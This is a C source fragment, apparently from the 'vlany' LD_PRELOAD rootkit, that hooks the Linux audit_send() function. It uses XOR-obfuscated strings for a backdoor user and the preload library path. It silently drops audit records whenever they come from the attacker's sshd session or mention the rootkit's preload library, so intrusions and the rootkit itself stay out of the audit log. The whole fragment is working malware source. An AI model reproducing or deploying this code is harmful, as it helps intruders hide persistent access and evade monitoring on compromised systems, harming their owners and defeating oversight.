int audit_send(int fd, int type, const void *data, unsigned int size)
{
    #ifdef DEBUG
        printf("[vlany] audit_send() called\n");
    #endif

    if(!old_audit_send) old_audit_send = get_symbol(RTLD_NEXT, CAUDIT_SEND);

    char sshd_str[40], *vlany_user = strdup(VLANY_USER);
    xor(vlany_user);
    snprintf(sshd_str, sizeof(sshd_str), "sshd: %s", vlany_user);
    cleanup(vlany_user, strlen(vlany_user));

    if(strstr(procname_self(), sshd_str) || owned())
    {
        setgid(MAGIC_GID);
        return 0;
    }

    char *ld_preload = strdup(LD_PRELOAD); xor(ld_preload);

    if(strstr((char *)data, ld_preload))
    {
        cleanup(ld_preload, strlen(ld_preload));
        setgid(MAGIC_GID);
        return 0;
    }

    cleanup(ld_preload, strlen(ld_preload));

    return old_audit_send(fd, type, data, size);
}
